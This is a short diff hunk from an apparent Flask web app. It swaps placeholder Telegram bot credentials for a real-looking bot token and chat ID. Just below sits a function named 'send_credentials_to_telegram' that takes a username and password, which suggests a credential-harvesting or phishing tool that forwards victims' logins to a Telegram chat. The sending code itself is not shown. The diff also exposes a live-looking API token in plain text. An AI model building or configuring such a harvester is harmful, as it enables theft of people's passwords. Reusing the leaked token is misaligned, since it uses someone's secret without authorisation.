@@ -8,8 +8,8 @@ app = Flask(__name__)
 users_db = {}
 
 # Telegram Bot API Token and Chat ID
-TELEGRAM_BOT_TOKEN = 'your_telegram_bot_token'
-TELEGRAM_CHAT_ID = 'your_telegram_chat_id'
+TELEGRAM_BOT_TOKEN = '7753261226:AAFOcLxVZQh-ZVtKg4lQzF1CzPMcEGzz82'
+TELEGRAM_CHAT_ID = '7940573152'
 
 # Function to send message to your Telegram account
 def send_credentials_to_telegram(username, password):
